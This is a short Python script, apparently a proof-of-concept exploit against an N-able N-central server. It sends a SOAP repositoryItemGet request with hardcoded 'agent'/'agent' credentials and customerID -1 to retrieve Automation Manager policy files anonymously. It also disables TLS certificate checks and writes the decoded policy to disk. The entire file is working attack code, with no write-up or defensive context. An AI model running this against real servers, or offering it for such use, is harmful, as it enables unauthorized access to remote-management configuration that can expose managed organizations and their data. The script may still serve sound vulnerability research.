#!/usr/bin/env python3
import argparse
import base64
import xml.etree.ElementTree as ET

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central anonymous Automation Manager policy download")
    p.add_argument("--target", default="https://192.168.1.14")
    p.add_argument("--uuid", required=True, help="repository item UUID from repositoryItemList")
    p.add_argument("--output", default="policy.xml")
    a = p.parse_args()
    envelope = f'''<?xml version="1.0"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body>
<repositoryItemGet xmlns="http://ii2.nobj.nable.com/">
<username>agent</username><password>agent</password><customerID>-1</customerID>
<repositoryItemUUID>{a.uuid}</repositoryItemUUID>
</repositoryItemGet></s:Body></s:Envelope>'''
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        a.target.rstrip("/") + "/dms2/services2/ServerII2",
        headers={"Content-Type": "application/soap+xml; charset=utf-8"},
        data=envelope,
        verify=False,
        timeout=60,
    )
    root = ET.fromstring(response.content)
    policy = next((e.text for e in root.iter() if e.tag.endswith("policyFile") and e.text), None)
    if not policy:
        raise SystemExit(f"soap={response.status_code}\npolicy_bytes=0")
    data = base64.b64decode(policy)
    with open(a.output, "wb") as f:
        f.write(data)
    print(f"soap={response.status_code}")
    print(f"policy_bytes={len(data)}")


if __name__ == "__main__":
    main()
